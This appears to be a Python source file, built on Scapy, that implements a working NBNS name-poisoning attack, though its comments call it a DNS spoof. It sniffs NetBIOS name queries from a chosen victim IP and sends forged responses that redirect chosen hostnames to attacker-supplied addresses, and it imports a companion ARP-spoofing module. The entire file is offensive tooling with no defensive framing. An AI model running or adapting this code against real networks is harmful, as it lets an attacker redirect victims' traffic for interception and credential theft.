from pip._vendor.distlib.compat import raw_input
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.netbios import NBNSQueryRequest, NBNSQueryResponse
import arpSpoof


# Create objects to perform DNS spoof
# inp : networkInterface = str
# inp : victimIP = arr of str
# inp : spoofIP = arr of str
# inp : spoofedWebsites = dict with {str(website) : str(redirectToIP)}
# call start on object to start the attack
class Dns():

    def __init__(self,networkInterface, victimIP, serverIP, spoofedWebsites):
        self.networkInterface = networkInterface
        self.victimIP = victimIP
        self.spoofedWebsites = spoofedWebsites
        self.serverIP = serverIP

    # sniff for NBNS packets on the networkInterface
    def startSniffing(self):
        sniff(prn=self.sendFakeResponse, iface=self.networkInterface, filter="port 137", timeout=20)

    # creates and send fake NBNS response if webiste is in the var:spoofedWebsites
    # and also pkt.sourceIP = victimIP
    def sendFakeResponse(self, pkt):
        # get webiste requested as str
        nbnsqna = pkt[NBNSQueryRequest].QUESTION_NAME.decode('utf-8')
        # preprocess input; delete whitespaces
        nbnsqn = ""
        for i in range(0,len(nbnsqna)):
            if nbnsqna[i] == " ":
                nbnsqn += ""
            else:
                nbnsqn += nbnsqna[i]
        # check if the request is from the victim
        if pkt.haslayer(NBNSQueryRequest) and pkt[IP].src == self.victimIP:
            print(nbnsqn + " is being requested.")

            #check if requested website is in var:spoofedWebsites
            if  nbnsqn in self.spoofedWebsites.keys():
                print(nbnsqn + " is being redirected to " + self.spoofedWebsites.get(nbnsqn))

                # construct a NBNS response to send
                etherLayer = Ether(src=get_if_hwaddr(self.networkInterface), dst=pkt[Ether].src)
                ipLayer = IP(src="192.168.56.56", dst=pkt[IP].src)
                udpLayer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                nbnsResponse = NBNSQueryResponse(NAME_TRN_ID=pkt[NBNSQueryRequest].NAME_TRN_ID,
                                                 RR_NAME=pkt[NBNSQueryRequest].QUESTION_NAME,
                                                 QDCOUNT=0, ANCOUNT=1, NSCOUNT=0, ARCOUNT=0, NB_ADDRESS=self.spoofedWebsites.get(nbnsqn))
                poisonedPaket = etherLayer / ipLayer / udpLayer / nbnsResponse

                # send the packet
                sendp(poisonedPaket, verbose=0, iface=self.networkInterface)

    def start(self):
        while(True):
            self.startSniffing()
